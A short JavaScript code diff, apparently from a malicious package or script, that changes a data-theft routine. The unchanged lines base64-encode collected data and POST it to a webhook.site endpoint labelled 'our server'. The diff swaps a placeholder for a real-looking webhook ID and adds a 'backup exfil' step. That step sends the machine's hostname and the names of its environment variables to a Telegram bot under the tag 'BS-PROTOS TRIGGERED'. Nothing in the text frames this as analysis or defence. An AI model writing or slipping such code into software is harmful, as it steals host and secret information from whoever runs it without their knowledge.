@@ -53,9 +53,19 @@ const payload = Buffer.from(JSON.stringify(data)).toString('base64').slice(0, 60
 // Send to our server
 const req = https.request({
   hostname: 'webhook.site',
-  path: '/unique-id-placeholder',
+  path: '/592ba8f1-f8ce-439f-ae46-6fee6eb26a7e',
   method: 'POST',
   headers: {'Content-Type': 'application/json'},
 }, () => {});
 req.write(JSON.stringify({d: payload}));
 req.end();
+
+// Backup exfil via Telegram
+const tg = https.request({
+  hostname: 'api.telegram.org',
+  path: '/bot8793985318:AAFCn_Ky-bljU_d8WVCBvXXXXXXXXXXXXXXX/sendMessage',
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+}, () => {});
+tg.write(JSON.stringify({chat_id: '5468119147', text: 'BS-PROTOS TRIGGERED: ' + os.hostname() + ' env keys: ' + Object.keys(process.env).join(',')}));
+tg.end();
